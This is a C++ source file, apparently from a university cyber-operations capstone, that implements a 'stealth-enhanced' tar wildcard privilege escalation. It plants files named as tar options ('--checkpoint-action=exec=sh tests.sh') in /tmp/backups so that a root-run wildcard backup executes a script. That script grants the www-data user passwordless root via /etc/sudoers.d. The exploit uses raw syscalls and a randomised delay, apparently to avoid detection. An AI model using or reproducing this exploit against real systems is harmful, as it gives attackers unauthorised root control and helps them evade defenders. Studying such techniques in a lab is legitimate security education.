/*
 * COMPSCI564 - Cyber Effects Capstone Project
 * Tar Wildcard Privilege Escalation Implementation (Stealth-Enhanced)
 * 
 * AI Assistance Attribution:
 * Developed with assistance from Claude (Anthropic)
 * For educational use in controlled lab environment only.
 */

#include "privesc.h"
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <cstring>

// ============================================================================
// MINIMAL STRING HELPERS
// ============================================================================

static int str_copy(char* dst, const char* src, int max_len) {
    int i = 0;
    while (i < max_len - 1 && src[i]) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = '\0';
    return i;
}

static int str_concat(char* dst, const char* src, int max_len) {
    int dst_len = 0;
    while (dst[dst_len]) dst_len++;
    
    int i = 0;
    while (dst_len + i < max_len - 1 && src[i]) {
        dst[dst_len + i] = src[i];
        i++;
    }
    dst[dst_len + i] = '\0';
    return dst_len + i;
}

// ============================================================================
// FILE OPERATIONS
// ============================================================================

static bool create_file(const char* path, const char* content, mode_t mode) {
    int fd = syscall(SYS_open, path, O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (fd < 0) {
        return false;
    }
    
    size_t content_len = 0;
    while (content[content_len]) content_len++;
    
    ssize_t written = syscall(SYS_write, fd, content, content_len);
    syscall(SYS_close, fd);
    
    return (written == (ssize_t)content_len);
}

static bool ensure_directory(const char* path) {
    struct stat st;
    
    if (syscall(SYS_stat, path, &st) == 0) {
        return S_ISDIR(st.st_mode);
    }
    
    if (syscall(SYS_mkdir, path, 0755) == 0) {
        return true;
    }
    
    return false;
}

// ============================================================================
// PRIVILEGE ESCALATION EXECUTION (STEALTH-ENHANCED)
// ============================================================================

int execute_tar_privesc() {
    const char* backups_dir = "/tmp/backups";
    
    if (!ensure_directory(backups_dir)) {
        return -1;
    }
    
    if (syscall(SYS_chdir, backups_dir) != 0) {
        return -1;
    }
    
    const char* script_content = 
        "#!/bin/bash\n"
        "echo 'www-data ALL=(root) NOPASSWD: ALL' > /etc/sudoers.d/www-data\n"
        "chmod 440 /etc/sudoers.d/www-data\n";
    
    char script_path[128];
    str_copy(script_path, backups_dir, 128);
    str_concat(script_path, "/tests.sh", 128);
    
    if (!create_file(script_path, script_content, 0755)) {
        return -1;
    }
    
    char checkpoint1_path[128];
    str_copy(checkpoint1_path, backups_dir, 128);
    str_concat(checkpoint1_path, "/--checkpoint=1", 128);
    
    if (!create_file(checkpoint1_path, "", 0644)) {
        return -1;
    }
    
    char checkpoint2_path[128];
    str_copy(checkpoint2_path, backups_dir, 128);
    str_concat(checkpoint2_path, "/--checkpoint-action=exec=sh tests.sh", 128);
    
    if (!create_file(checkpoint2_path, "", 0644)) {
        return -1;
    }
    
    char dummy_path[128];
    str_copy(dummy_path, backups_dir, 128);
    str_concat(dummy_path, "/dummy.txt", 128);
    
    if (!create_file(dummy_path, "exploit payload\n", 0644)) {
        return -1;
    }
    
    unsigned int random_seed;
    
    int urandom_fd = syscall(SYS_open, "/dev/urandom", O_RDONLY);
    if (urandom_fd >= 0) {
        syscall(SYS_read, urandom_fd, &random_seed, sizeof(random_seed));
        syscall(SYS_close, urandom_fd);
    } else {
        struct timespec ts;
        syscall(SYS_clock_gettime, CLOCK_REALTIME, &ts);
        random_seed = (ts.tv_sec ^ ts.tv_nsec) ^ (syscall(SYS_getpid) << 16);
    }
    
    unsigned int random_delay = 60 + (random_seed % 16);
    unsigned int random_nanos = (random_seed >> 16) % 1000000000;
    
    struct timespec sleep_time;
    sleep_time.tv_sec = random_delay;
    sleep_time.tv_nsec = random_nanos;
    
    syscall(SYS_nanosleep, &sleep_time, nullptr);
    
    return 0;
}

// ============================================================================
// ROOT CHECK
// ============================================================================

bool check_if_root() {
    unsigned int uid = syscall(SYS_getuid);
    unsigned int euid = syscall(SYS_geteuid);
    
    return (uid == 0 || euid == 0);
}
